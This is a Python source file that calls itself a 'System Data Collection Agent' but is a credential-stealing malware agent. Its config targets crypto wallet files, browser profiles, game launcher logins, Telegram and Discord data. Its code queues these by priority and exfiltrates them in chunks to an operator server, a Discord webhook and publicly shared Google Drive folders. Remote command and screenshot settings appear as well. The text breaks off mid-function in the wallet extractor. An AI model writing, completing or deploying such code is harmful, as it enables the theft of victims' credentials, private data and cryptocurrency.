#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔥 Enhanced System Data Collection Agent - Ultimate Version
🎯 Priority-Based Data Extraction with Multiple Upload Methods
🚀 Enhanced Remote Control + Crypto/Gaming/Browser Support
📡 Socket.IO + Discord Webhook + Google Drive Integration
"""

import os
import sys
import json
import time
import sqlite3
import shutil
import socket
import platform
import subprocess
import threading
import zipfile
import base64
import hashlib
import logging
import requests
from datetime import datetime
from pathlib import Path
import psutil
import win32crypt
from Crypto.Cipher import AES
import winreg
from urllib.parse import urlparse
import tempfile
import uuid
import signal
import socketio
import glob
import re
import configparser
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue
import asyncio
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload

# 🔥 ENHANCED CONFIGURATION WITH PRIORITY SYSTEM
CONFIG = {
    "SERVER_URL": "https://your-render-app.onrender.com",
    "API_URL": "https://your-render-app.onrender.com/api", 
    "AGENT_TOKEN": "your-secure-agent-token-here",
    "CLIENT_ID": str(uuid.getnode()),
    "CLIENT_NAME": platform.node(),
    "RECONNECT_DELAY": 5,
    "HEARTBEAT_INTERVAL": 30,
    "MAX_FILE_SIZE": 100 * 1024 * 1024,  # 100MB
    
    # 🎯 PRIORITY SYSTEM SETTINGS
    "PRIORITY_SYSTEM": {
        "enabled": True,
        "critical_first": True,
        "batch_size": 3,
        "wait_between_batches": 1,
        "max_concurrent_uploads": 5,
        "retry_failed_uploads": True,
        "max_retries": 3,
        "priority_thresholds": {
            "CRITICAL": 1,    # Crypto wallets, passwords, tokens
            "HIGH": 2,        # Browser credentials, gaming accounts
            "MEDIUM": 3,      # Messaging apps, social media
            "LOW": 4,         # System files, documents
            "BULK": 5         # Large files, media, downloads
        }
    },
    
    # 🚀 MULTIPLE UPLOAD METHODS
    "UPLOAD_METHODS": {
        "socketio": {
            "enabled": True, 
            "primary": True, 
            "max_size": 50 * 1024 * 1024,
            "chunk_size": 5 * 1024 * 1024,
            "timeout": 120
        },
        "webhook": {
            "enabled": True, 
            "fallback": True, 
            "max_size": 25 * 1024 * 1024,
            "chunk_size": 8 * 1024 * 1024,
            "timeout": 60
        },
        "google_drive": {
            "enabled": True, 
            "large_files": True, 
            "max_size": 500 * 1024 * 1024,
            "chunk_size": 10 * 1024 * 1024,
            "timeout": 300
        }
    },
    
    # Discord Webhook Configuration
    "WEBHOOK_CONFIG": {
        "discord_webhook": "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
        "use_for_notifications": True,
        "max_message_length": 2000,
        "embed_colors": {
            "critical": 0xFF0000,  # Red
            "high": 0xFF8C00,      # Orange  
            "medium": 0xFFD700,    # Gold
            "low": 0x00FF00,       # Green
            "success": 0x00FF00,   # Green
            "error": 0xFF0000      # Red
        }
    },
    
    # Google Drive Configuration
    "GOOGLE_DRIVE_CONFIG": {
        "service_account_file": "service_account_credentials.json",
        "parent_folder_id": "YOUR_GOOGLE_DRIVE_FOLDER_ID",
        "share_with_owner": True,
        "auto_organize": True,
        "folder_structure": {
            "critical": "Critical_Data",
            "high": "High_Priority",
            "medium": "Medium_Priority", 
            "low": "Low_Priority",
            "bulk": "Bulk_Files"
        }
    },
    
    # 💎 Enhanced Crypto Wallet Support
    "CRYPTO_WALLET_PATHS": {
        "metamask": [
            "C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
            "C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\IndexedDB\\chrome-extension_nkbihfbeogaeaoehlefnkodbefgpgknn*",
            "C:\\Users\\*\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
            "C:\\Users\\*\\AppData\\Roaming\\MetaMask"
        ],
        "exodus": [
            "C:\\Users\\*\\AppData\\Roaming\\Exodus",
            "C:\\Users\\*\\AppData\\Local\\Exodus"
        ],
        "electrum": [
            "C:\\Users\\*\\AppData\\Roaming\\Electrum\\wallets",
            "C:\\Users\\*\\AppData\\Local\\Electrum\\wallets"
        ],
        "bitcoin_core": [
            "C:\\Users\\*\\AppData\\Roaming\\Bitcoin\\wallet.dat",
            "C:\\Users\\*\\Bitcoin\\wallet.dat"
        ],
        "trust_wallet": [
            "C:\\Users\\*\\AppData\\Local\\TrustWallet",
            "C:\\Users\\*\\AppData\\Roaming\\TrustWallet"
        ],
        "atomic_wallet": [
            "C:\\Users\\*\\AppData\\Roaming\\atomic",
            "C:\\Users\\*\\AppData\\Local\\atomic"
        ],
        "coinomi": [
            "C:\\Users\\*\\AppData\\Local\\Coinomi\\Coinomi",
            "C:\\Users\\*\\AppData\\Roaming\\Coinomi"
        ],
        "phantom": [
            "C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"
        ],
        "solflare": [
            "C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic"
        ],
        "binance_wallet": [
            "C:\\Users\\*\\AppData\\Local\\BinanceWallet",
            "C:\\Users\\*\\AppData\\Roaming\\Binance"
        ]
    },
    
    # 🎮 Enhanced Gaming Platforms Support
    "GAMING_PLATFORMS": {
        "steam": [
            "C:\\Users\\*\\AppData\\Roaming\\Steam\\config",
            "C:\\Users\\*\\AppData\\Local\\Steam\\config",
            "C:\\Program Files (x86)\\Steam\\config",
            "C:\\Program Files\\Steam\\config",
            "C:\\Users\\*\\AppData\\Roaming\\Steam\\loginusers.vdf"
        ],
        "epic_games": [
            "C:\\Users\\*\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config",
            "C:\\Users\\*\\AppData\\Roaming\\Epic\\EpicGamesLauncher",
            "C:\\Users\\*\\AppData\\Local\\UnrealEngine",
            "C:\\Users\\*\\Documents\\My Games\\Epic Games"
        ],
        "origin": [
            "C:\\Users\\*\\AppData\\Roaming\\Origin",
            "C:\\Users\\*\\AppData\\Local\\Origin",
            "C:\\Users\\*\\AppData\\Local\\Electronic Arts"
        ],
        "uplay": [
            "C:\\Users\\*\\AppData\\Local\\Ubisoft Game Launcher",
            "C:\\Users\\*\\Documents\\My Games\\Ubisoft Game Launcher",
            "C:\\Users\\*\\AppData\\Roaming\\Ubisoft"
        ],
        "battle_net": [
            "C:\\Users\\*\\AppData\\Roaming\\Battle.net",
            "C:\\Users\\*\\AppData\\Local\\Blizzard Entertainment\\Battle.net",
            "C:\\ProgramData\\Blizzard Entertainment"
        ],
        "gog": [
            "C:\\Users\\*\\AppData\\Local\\GOG.com\\Galaxy\\Configuration",
            "C:\\ProgramData\\GOG.com\\Galaxy"
        ],
        "rockstar": [
            "C:\\Users\\*\\AppData\\Local\\Rockstar Games\\Launcher",
            "C:\\Users\\*\\Documents\\Rockstar Games"
        ]
    },
    
    # 🌐 Enhanced Browser Support
    "BROWSER_PATHS": {
        "chrome": [
            os.path.expanduser("~/AppData/Local/Google/Chrome/User Data"),
            "C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data"
        ],
        "edge": [
            os.path.expanduser("~/AppData/Local/Microsoft/Edge/User Data"),
            "C:\\Users\\*\\AppData\\Local\\Microsoft\\Edge\\User Data"
        ],
        "opera": [
            os.path.expanduser("~/AppData/Roaming/Opera Software/Opera Stable"),
            "C:\\Users\\*\\AppData\\Roaming\\Opera Software\\Opera Stable"
        ],
        "opera_gx": [
            "C:\\Users\\*\\AppData\\Roaming\\Opera Software\\Opera GX Stable",
            os.path.expanduser("~/AppData/Roaming/Opera Software/Opera GX Stable")
        ],
        "firefox": [
            os.path.expanduser("~/AppData/Roaming/Mozilla/Firefox/Profiles"),
            "C:\\Users\\*\\AppData\\Roaming\\Mozilla/Firefox/Profiles"
        ],
        "brave": [
            "C:\\Users\\*\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
            "C:\\Users\\*\\AppData\\Roaming\\brave"
        ],
        "vivaldi": [
            "C:\\Users\\*\\AppData\\Local\\Vivaldi\\User Data",
            "C:\\Users\\*\\AppData\\Roaming\\Vivaldi"
        ],
        "chromium": [
            "C:\\Users\\*\\AppData\\Local\\Chromium\\User Data"
        ]
    },
    
    "TELEGRAM_PATHS": [
        os.path.expanduser("~/AppData/Roaming/Telegram Desktop/tdata"),
        os.path.expanduser("~/AppData/Local/Telegram Desktop/tdata"),
        "C:\\Users\\*\\AppData\\Roaming\\Telegram Desktop\\tdata",
        "C:\\Users\\*\\AppData\\Local\\Telegram Desktop\\tdata"
    ],
    
    "DISCORD_PATHS": [
        os.path.expanduser("~/AppData/Roaming/discord"),
        os.path.expanduser("~/AppData/Local/Discord"),
        "C:\\Users\\*\\AppData\\Roaming/discord",
        "C:\\Users\\*\\AppData\\Local/Discord",
        "C:\\Users\\*\\AppData\\Roaming/discordcanary",
        "C:\\Users\\*\\AppData\\Roaming/discordptb"
    ],
    
    # 📡 Enhanced Remote Control Settings
    "REMOTE_CONTROL": {
        "enabled": True,
        "command_timeout": 30,
        "max_command_length": 1000,
        "allowed_commands": ["dir", "whoami", "ipconfig", "systeminfo", "tasklist", "netstat"],
        "restricted_commands": ["format", "del", "rmdir", "shutdown"],
        "command_history_size": 100,
        "auto_screenshot": True,
        "keylogger": False,
        "enhanced_security": True,
        "session_encryption": True
    }
}

# Enhanced logging setup
def setup_enhanced_logging():
    """Setup comprehensive logging system"""
    log_dir = os.path.join(tempfile.gettempdir(), "enhanced_agent_logs")
    os.makedirs(log_dir, exist_ok=True)
    
    log_file = os.path.join(log_dir, f"agent_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - [%(filename)s:%(lineno)d] - %(message)s',
        handlers=[
            logging.FileHandler(log_file, encoding='utf-8'),
            logging.StreamHandler(sys.stdout)
        ]
    )
    return logging.getLogger(__name__)

logger = setup_enhanced_logging()

class EnhancedPriorityQueue:
    """🎯 Advanced priority queue with intelligent batching and statistics"""
    
    def __init__(self):
        self.queues = {
            1: queue.PriorityQueue(),  # CRITICAL
            2: queue.PriorityQueue(),  # HIGH
            3: queue.PriorityQueue(),  # MEDIUM
            4: queue.PriorityQueue(),  # LOW
            5: queue.PriorityQueue()   # BULK
        }
        self.stats = {
            "total_items": 0,
            "processed": 0,
            "failed": 0,
            "by_priority": {1: 0, 2: 0, 3: 0, 4: 0, 5: 0},
            "processing_times": [],
            "start_time": datetime.now()
        }
        self.lock = threading.Lock()
    
    def add_item(self, item, priority=4):
        """Add item to appropriate priority queue with timestamp"""
        if priority not in self.queues:
            priority = 4  # Default to LOW
            
        # Add timestamp and unique ID
        item["queue_timestamp"] = datetime.now().isoformat()
        item["item_id"] = str(uuid.uuid4())[:8]
        
        with self.lock:
            # Use negative timestamp for priority within same level (newer first)
            timestamp_priority = -time.time()
            self.queues[priority].put((timestamp_priority, item))
            self.stats["total_items"] += 1
            self.stats["by_priority"][priority] += 1
            
        logger.info(f"📥 Added to P{priority} queue: {item.get('type', 'unknown')} (ID: {item['item_id']})")
    
    def get_next_batch(self, batch_size=3):
        """Get next batch of items, prioritizing critical data"""
        batch = []
        
        with self.lock:
            # Process queues by priority (1=highest, 5=lowest)
            for priority in sorted(self.queues.keys()):
                queue_obj = self.queues[priority]
                
                while len(batch) < batch_size and not queue_obj.empty():
                    try:
                        timestamp_priority, item = queue_obj.get_nowait()
                        item["processing_started"] = datetime.now().isoformat()
                        batch.append(item)
                        self.stats["processed"] += 1
                    except queue.Empty:
                        break
                        
                if len(batch) >= batch_size:
                    break
        
        if batch:
            priorities = [item.get('priority', 4) for item in batch]
            types = [item.get('type', 'unknown') for item in batch]
            logger.info(f"📦 Batch ready: {len(batch)} items | Priorities: {priorities} | Types: {types}")
            
        return batch
    
    def mark_failed(self, item_id, error):
        """Mark item as failed"""
        with self.lock:
            self.stats["failed"] += 1
            logger.error(f"❌ Item {item_id} failed: {error}")
    
    def is_empty(self):
        """Check if all queues are empty"""
        with self.lock:
            return all(q.empty() for q in self.queues.values())
    
    def get_comprehensive_stats(self):
        """Get comprehensive queue statistics"""
        with self.lock:
            stats = self.stats.copy()
            stats["runtime"] = str(datetime.now() - stats["start_time"])
            stats["success_rate"] = (stats["processed"] - stats["failed"]) / max(stats["processed"], 1) * 100
            return stats

class EnhancedMultiUploadManager:
    """🚀 Advanced upload manager with multiple methods and intelligent routing"""
    
    def __init__(self):
        self.methods = {}
        self.stats = {
            "uploads_attempted": 0,
            "uploads_successful": 0,
            "uploads_failed": 0,
            "bytes_uploaded": 0,
            "methods_used": {"socketio": 0, "webhook": 0, "google_drive": 0},
            "method_success_rates": {"socketio": 0, "webhook": 0, "google_drive": 0},
            "average_upload_times": {"socketio": [], "webhook": [], "google_drive": []}
        }
        
        # Initialize all upload methods
        self._init_socketio()
        self._init_webhook()
        self._init_google_drive()
        
        logger.info(f"🚀 Upload manager initialized with {len(self.methods)} methods")
    
    def _init_socketio(self):
        """Initialize Socket.IO upload method"""
        if CONFIG["UPLOAD_METHODS"]["socketio"]["enabled"]:
            self.methods["socketio"] = {
                "enabled": True,
                "max_size": CONFIG["UPLOAD_METHODS"]["socketio"]["max_size"],
                "upload_func": self._upload_via_socketio,
                "priority_score": 10  # Highest priority
            }
            logger.info("✅ Socket.IO upload method initialized")
    
    def _init_webhook(self):
        """Initialize Discord webhook upload method"""
        if CONFIG["UPLOAD_METHODS"]["webhook"]["enabled"]:
            webhook_url = CONFIG["WEBHOOK_CONFIG"]["discord_webhook"]
            if webhook_url and "YOUR_WEBHOOK" not in webhook_url:
                self.methods["webhook"] = {
                    "enabled": True,
                    "max_size": CONFIG["UPLOAD_METHODS"]["webhook"]["max_size"],
                    "upload_func": self._upload_via_webhook,
                    "priority_score": 8  # Medium priority
                }
                logger.info("✅ Discord webhook upload method initialized")
            else:
                logger.warning("⚠️ Webhook URL not configured properly")
    
    def _init_google_drive(self):
        """Initialize Google Drive upload method"""
        if CONFIG["UPLOAD_METHODS"]["google_drive"]["enabled"]:
            service_file = CONFIG["GOOGLE_DRIVE_CONFIG"]["service_account_file"]
            if os.path.exists(service_file):
                try:
                    # Test credentials
                    scopes = ['https://www.googleapis.com/auth/drive']
                    credentials = service_account.Credentials.from_service_account_file(service_file, scopes=scopes)
                    service = build('drive', 'v3', credentials=credentials)
                    
                    self.methods["google_drive"] = {
                        "enabled": True,
                        "max_size": CONFIG["UPLOAD_METHODS"]["google_drive"]["max_size"],
                        "upload_func": self._upload_via_google_drive,
                        "priority_score": 9,  # High priority
                        "service": service
                    }
                    logger.info("✅ Google Drive upload method initialized")
                except Exception as e:
                    logger.error(f"❌ Failed to initialize Google Drive: {e}")
            else:
                logger.warning("⚠️ Google Drive service account file not found")
    
    async def upload_file_with_priority(self, file_path, file_info, priority=4):
        """Upload file using best method based on size, priority, and availability"""
        start_time = time.time()
        self.stats["uploads_attempted"] += 1
        
        if not os.path.exists(file_path):
            logger.error(f"❌ File not found: {file_path}")
            return {"status": "error", "error": "File not found"}
        
        file_size = os.path.getsize(file_path)
        
        # Select best upload method
        method_name, method = self._select_optimal_upload_method(file_size, priority)
        
        if not method:
            logger.error(f"❌ No suitable upload method for file: {file_path} (size: {file_size:,} bytes)")
            self.stats["uploads_failed"] += 1
            return {"status": "error", "error": "No upload method available"}
        
        try:
            logger.info(f"📤 Uploading via {method_name}: {os.path.basename(file_path)} (P{priority}, {file_size:,} bytes)")
            
            result = await method["upload_func"](file_path, file_info)
            
            upload_time = time.time() - start_time
            
            if result.get("status") == "success":
                self.stats["uploads_successful"] += 1
                self.stats["bytes_uploaded"] += file_size
                self.stats["methods_used"][method_name] += 1
                self.stats["average_upload_times"][method_name].append(upload_time)
                
                logger.info(f"✅ Upload successful via {method_name}: {os.path.basename(file_path)} ({upload_time:.1f}s)")
                result["upload_time"] = upload_time
                result["method"] = method_name
                return result
            else:
                raise Exception(result.get("error", "Upload failed"))
                
        except Exception as e:
            logger.error(f"❌ Upload failed via {method_name}: {e}")
            # Try fallback method
            return await self._try_fallback_upload(file_path, file_info, method_name, priority)
    
    def _select_optimal_upload_method(self, file_size, priority):
        """Select optimal upload method based on file size, priority, and performance"""
        available_methods = []
        
        for method_name, method in self.methods.items():
            if not method["enabled"] or file_size > method["max_size"]:
                continue
                
            # Calculate method score based on priority, size, and performance
            score = method["priority_score"]
            
            # Boost score for critical data on reliable methods
            if priority == 1 and method_name == "socketio":
                score += 5
            elif priority <= 2 and method_name == "google_drive":
                score += 3
                
            # Consider historical success rate
            method_attempts = self.stats["methods_used"][method_name]
            if method_attempts > 0:
                avg_time = sum(self.stats["average_upload_times"][method_name]) / len(self.stats["average_upload_times"][method_name])
                if avg_time < 10:  # Fast uploads get bonus
                    score += 2
            
            available_methods.append((score, method_name, method))
        
        if not available_methods:
            return None, None
            
        # Sort by score (highest first) and return best method
        available_methods.sort(reverse=True)
        best_score, best_method_name, best_method = available_methods[0]
        
        logger.debug(f"🎯 Selected {best_method_name} (score: {best_score}) for {file_size:,} bytes, P{priority}")
        return best_method_name, best_method
    
    async def _try_fallback_upload(self, file_path, file_info, failed_method, priority):
        """Try alternative upload methods if primary fails"""
        file_size = os.path.getsize(file_path)
        
        for method_name, method in self.methods.items():
            if method_name == failed_method or not method["enabled"]:
                continue
                
            if file_size <= method["max_size"]:
                try:
                    logger.info(f"🔄 Trying fallback: {method_name}")
                    result = await method["upload_func"](file_path, file_info)
                    
                    if result.get("status") == "success":
                        self.stats["methods_used"][method_name] += 1
                        logger.info(f"✅ Fallback successful via {method_name}")
                        result["method"] = method_name
                        result["is_fallback"] = True
                        return result
                        
                except Exception as e:
                    logger.error(f"❌ Fallback failed via {method_name}: {e}")
                    continue
        
        self.stats["uploads_failed"] += 1
        return {"status": "error", "error": "All upload methods failed", "failed_methods": list(self.methods.keys())}
    
    async def _upload_via_socketio(self, file_path, file_info):
        """Enhanced Socket.IO upload with chunking and retry logic"""
        try:
            file_size = os.path.getsize(file_path)
            chunk_size = CONFIG["UPLOAD_METHODS"]["socketio"]["chunk_size"]
            
            # For large files, use chunked upload
            if file_size > chunk_size:
                return await self._chunked_socketio_upload(file_path, file_info)
            
            # Direct upload for smaller files
            with open(file_path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            
            upload_data = {
                "client_id": CONFIG["CLIENT_ID"],
                "client_name": CONFIG["CLIENT_NAME"],
                "file_name": os.path.basename(file_path),
                "file_path": file_path,
                "file_size": file_size,
                "file_data": file_data,
                "priority": file_info.get("priority", 4),
                "item_type": file_info.get("type", "unknown"),
                "upload_time": datetime.now().isoformat(),
                "upload_method": "socketio_direct"
            }
            
            headers = {
                'Content-Type': 'application/json',
                'X-Agent-Token': CONFIG['AGENT_TOKEN'],
                'X-Priority': str(file_info.get("priority", 4)),
                'X-Client-ID': CONFIG["CLIENT_ID"]
            }
            
            timeout = CONFIG["UPLOAD_METHODS"]["socketio"]["timeout"]
            response = requests.post(
                f"{CONFIG['API_URL']}/upload",
                json=upload_data,
                headers=headers,
                timeout=timeout
            )
            
            if response.status_code == 200:
                result = response.json()
                logger.info(f"✅ Socket.IO direct upload: {os.path.basename(file_path)}")
                return {"status": "success", "response": result, "file_path": file_path}
            else:
                logger.error(f"❌ Socket.IO upload error: HTTP {response.status_code}")
                return {"status": "error", "error": f"HTTP {response.status_code}: {response.text}"}
                
        except Exception as e:
            logger.error(f"❌ Socket.IO upload exception: {e}")
            return {"status": "error", "error": str(e)}
    
    async def _chunked_socketio_upload(self, file_path, file_info):
        """Chunked upload for large files via Socket.IO"""
        try:
            file_size = os.path.getsize(file_path)
            chunk_size = CONFIG["UPLOAD_METHODS"]["socketio"]["chunk_size"]
            total_chunks = (file_size + chunk_size - 1) // chunk_size
            upload_id = str(uuid.uuid4())
            
            logger.info(f"📦 Starting chunked upload: {total_chunks} chunks for {os.path.basename(file_path)}")
            
            # Initialize upload session
            init_data = {
                "client_id": CONFIG["CLIENT_ID"],
                "upload_id": upload_id,
                "file_name": os.path.basename(file_path),
                "file_size": file_size,
                "total_chunks": total_chunks,
                "priority": file_info.get("priority", 4),
                "item_type": file_info.get("type", "unknown")
            }
            
            headers = {
                'Content-Type': 'application/json',
                'X-Agent-Token': CONFIG['AGENT_TOKEN']
            }
            
            # Initialize upload session
            response = requests.post(
                f"{CONFIG['API_URL']}/upload/init",
                json=init_data,
                headers=headers,
                timeout=30
            )
            
            if response.status_code != 200:
                return {"status": "error", "error": f"Failed to initialize chunked upload: {response.text}"}
            
            # Upload chunks
            with open(file_path, 'rb') as f:
                for chunk_num in range(total_chunks):
                    chunk_data = f.read(chunk_size)
                    if not chunk_data:
                        break
                    
                    chunk_upload_data = {
                        "upload_id": upload_id,
                        "chunk_number": chunk_num,
                        "chunk_data": base64.b64encode(chunk_data).decode(),
                        "is_last_chunk": chunk_num == total_chunks - 1
                    }
                    
                    chunk_response = requests.post(
                        f"{CONFIG['API_URL']}/upload/chunk",
                        json=chunk_upload_data,
                        headers=headers,
                        timeout=60
                    )
                    
                    if chunk_response.status_code != 200:
                        return {"status": "error", "error": f"Chunk {chunk_num} upload failed"}
                    
                    logger.info(f"📤 Chunk {chunk_num + 1}/{total_chunks} uploaded")
            
            logger.info(f"✅ Chunked Socket.IO upload completed: {os.path.basename(file_path)}")
            return {"status": "success", "upload_id": upload_id, "file_path": file_path}
            
        except Exception as e:
            logger.error(f"❌ Chunked Socket.IO upload failed: {e}")
            return {"status": "error", "error": str(e)}
    
    async def _upload_via_webhook(self, file_path, file_info):
        """Enhanced Discord webhook upload with embed notifications"""
        try:
            webhook_url = CONFIG["WEBHOOK_CONFIG"]["discord_webhook"]
            if not webhook_url or "YOUR_WEBHOOK" in webhook_url:
                return {"status": "error", "error": "Webhook not configured"}
            
            file_size = os.path.getsize(file_path)
            max_size = CONFIG["UPLOAD_METHODS"]["webhook"]["max_size"]
            
            if file_size > max_size:
                return {"status": "error", "error": f"File too large for webhook ({file_size:,} > {max_size:,} bytes)"}
            
            # Create enhanced embed notification
            embed = self._create_upload_embed(file_path, file_info)
            
            # Upload file with embed
            with open(file_path, 'rb') as f:
                files = {
                    'file': (os.path.basename(file_path), f.read(), 'application/octet-stream')
                }
                
                payload = {
                    'embeds': [embed]
                }
                
                response = requests.post(
                    webhook_url,
                    files=files,
                    data={'payload_json': json.dumps(payload)},
                    timeout=CONFIG["UPLOAD_METHODS"]["webhook"]["timeout"]
                )
            
            if response.status_code == 200:
                logger.info(f"✅ Webhook upload successful: {os.path.basename(file_path)}")
                return {"status": "success", "file_path": file_path, "webhook_response": response.json()}
            else:
                logger.error(f"❌ Webhook upload failed: HTTP {response.status_code}")
                return {"status": "error", "error": f"HTTP {response.status_code}: {response.text}"}
                
        except Exception as e:
            logger.error(f"❌ Webhook upload exception: {e}")
            return {"status": "error", "error": str(e)}
    
    def _create_upload_embed(self, file_path, file_info):
        """Create rich embed for Discord webhook notification"""
        file_size = os.path.getsize(file_path)
        priority = file_info.get("priority", 4)
        
        priority_names = {1: "🔥 CRITICAL", 2: "⚡ HIGH", 3: "📱 MEDIUM", 4: "📄 LOW", 5: "📦 BULK"}
        priority_colors = CONFIG["WEBHOOK_CONFIG"]["embed_colors"]
        color_map = {1: "critical", 2: "high", 3: "medium", 4: "low", 5: "low"}
        
        embed = {
            "title": f"🔒 Agent Upload - {priority_names.get(priority, '📄 UNKNOWN')}",
            "description": f"**File:** `{os.path.basename(file_path)}`\n**Type:** `{file_info.get('type', 'unknown')}`",
            "color": priority_colors.get(color_map.get(priority, "low"), 0x00FF00),
            "fields": [
                {
                    "name": "📊 File Info",
                    "value": f"**Size:** {file_size:,} bytes\n**Priority:** {priority}\n**Client:** {CONFIG['CLIENT_ID'][:8]}",
                    "inline": True
                },
                {
                    "name": "⏰ Timing",
                    "value": f"**Upload Time:** {datetime.now().strftime('%H:%M:%S')}\n**Date:** {datetime.now().strftime('%Y-%m-%d')}",
                    "inline": True
                }
            ],
            "footer": {
                "text": f"Enhanced Agent v3.0 • Client: {CONFIG['CLIENT_NAME'][:20]}"
            },
            "timestamp": datetime.now().isoformat()
        }
        
        return embed
    
    async def _upload_via_google_drive(self, file_path, file_info):
        """Enhanced Google Drive upload with folder organization"""
        try:
            if "google_drive" not in self.methods:
                return {"status": "error", "error": "Google Drive not initialized"}
            
            service = self.methods["google_drive"]["service"]
            parent_folder_id = CONFIG["GOOGLE_DRIVE_CONFIG"]["parent_folder_id"]
            
            if "YOUR_GOOGLE_DRIVE" in parent_folder_id:
                return {"status": "error", "error": "Google Drive folder ID not configured"}
            
            # Get or create priority-based subfolder
            priority = file_info.get("priority", 4)
            target_folder_id = await self._get_or_create_priority_folder(service, parent_folder_id, priority)
            
            # Prepare file metadata
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            priority_prefix = {1: "CRITICAL", 2: "HIGH", 3: "MEDIUM", 4: "LOW", 5: "BULK"}
            
            file_metadata = {
                'name': f"{priority_prefix.get(priority, 'UNKNOWN')}_Agent_{CONFIG['CLIENT_ID'][:8]}_{timestamp}_{os.path.basename(file_path)}",
                'parents': [target_folder_id],
                'description': f"Priority: {priority} | Type: {file_info.get('type', 'unknown')} | Client: {CONFIG['CLIENT_NAME']}"
            }
            
            # Upload with resumable media
            media = MediaFileUpload(
                file_path, 
                resumable=True,
                chunksize=CONFIG["GOOGLE_DRIVE_CONFIG"].get("chunk_size", 10 * 1024 * 1024)
            )
            
            request = service.files().create(body=file_metadata, media_body=media)
            
            # Execute upload with progress tracking
            response = None
            retries = 3
            
            for attempt in range(retries):
                try:
                    response = request.execute()
                    break
                except Exception as e:
                    if attempt < retries - 1:
                        logger.warning(f"⚠️ Google Drive upload attempt {attempt + 1} failed, retrying: {e}")
                        await asyncio.sleep(2 ** attempt)  # Exponential backoff
                    else:
                        raise e
            
            if response and response.get('id'):
                # Share file if configured
                if CONFIG["GOOGLE_DRIVE_CONFIG"].get("share_with_owner", False):
                    await self._share_file_with_owner(service, response['id'])
                
                logger.info(f"✅ Google Drive upload successful: {os.path.basename(file_path)}")
                return {
                    "status": "success",
                    "file_path": file_path,
                    "drive_file_id": response['id'],
                    "drive_file_name": response['name'],
                    "folder_id": target_folder_id
                }
            else:
                return {"status": "error", "error": "Google Drive upload failed - no file ID returned"}
                
        except Exception as e:
            logger.error(f"❌ Google Drive upload exception: {e}")
            return {"status": "error", "error": str(e)}
    
    async def _get_or_create_priority_folder(self, service, parent_folder_id, priority):
        """Get or create priority-based subfolder in Google Drive"""
        try:
            folder_structure = CONFIG["GOOGLE_DRIVE_CONFIG"]["folder_structure"]
            priority_names = {1: "critical", 2: "high", 3: "medium", 4: "low", 5: "bulk"}
            folder_name = folder_structure.get(priority_names.get(priority, "low"), "Other")
            
            # Search for existing folder
            query = f"name='{folder_name}' and parents in '{parent_folder_id}' and mimeType='application/vnd.google-apps.folder'"
            results = service.files().list(q=query).execute()
            items = results.get('files', [])
            
            if items:
                return items[0]['id']
            
            # Create new folder if not exists
            folder_metadata = {
                'name': folder_name,
                'parents': [parent_folder_id],
                'mimeType': 'application/vnd.google-apps.folder'
            }
            
            folder = service.files().create(body=folder_metadata).execute()
            logger.info(f"📁 Created Google Drive folder: {folder_name}")
            return folder['id']
            
        except Exception as e:
            logger.error(f"❌ Error creating Google Drive folder: {e}")
            return parent_folder_id  # Fall back to parent folder
    
    async def _share_file_with_owner(self, service, file_id):
        """Share uploaded file with the Drive owner"""
        try:
            permission = {
                'type': 'anyone',
                'role': 'reader'
            }
            service.permissions().create(fileId=file_id, body=permission).execute()
            logger.debug(f"🔗 File {file_id} shared successfully")
        except Exception as e:
            logger.debug(f"⚠️ Could not share file {file_id}: {e}")

class UltimateCryptoWalletExtractor:
    """💎 Ultimate cryptocurrency wallet extraction with enhanced detection"""
    
    def __init__(self, priority_queue):
        self.priority_queue = priority_queue
        self.wallet_data = {}
        self.extraction_stats = {
            "wallets_found": 0,
            "critical_files": 0,
            "total_size": 0,
            "backup_created": 0
        }
    
    def extract_all_wallets(self):
        """Extract all cryptocurrency wallet data with CRITICAL priority"""
        logger.info("🔥 Starting ULTIMATE cryptocurrency wallet extraction...")
        
        extraction_start = time.time()
        
        for wallet_name, paths in CONFIG["CRYPTO_WALLET_PATHS"].items():
            logger.info(f"💎 Scanning {wallet_name} wallet...")
            wallet_info = self._extract_wallet_data_enhanced(wallet_name, paths)
            
            if wallet_info and wallet_info.get("files"):
                self.wallet_data[wallet_name] = wallet_info
                self.extraction_stats["wallets_found"] += 1
                self.extraction_stats["critical_files"] += len(wallet_info["files"])
                self.extraction_stats["total_size"] += wallet_info.get("total_size", 0)
                
                # Add to CRITICAL priority queue
                self.priority_queue.add_item({
                    "type": "crypto_wallet",
                    "wallet_name": wallet_name,
                    "data": wallet_info,
                    "priority": CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["CRITICAL"],
                    "size_estimate": wallet_info.get("total_size", 0),
                    "extraction_method": "enhanced_detection"
                }, priority=CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["CRITICAL"])
                
                logger.info(f"💎 {wallet_name}: {len(wallet_info['files'])} files, {wallet_info.get('total_size', 0):,} bytes")
        
        # Enhanced browser wallet extraction
        browser_wallets = self._extract_browser_wallet_data_enhanced()
        if browser_wallets:
            self.wallet_data["browser_wallets"] = browser_wallets
            self.extraction_stats["wallets_found"] += len(browser_wallets)
            
            self.priority_queue.add_item({
                "type": "browser_crypto_wallets",
                "data": browser_wallets,
                "priority": CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["CRITICAL"],
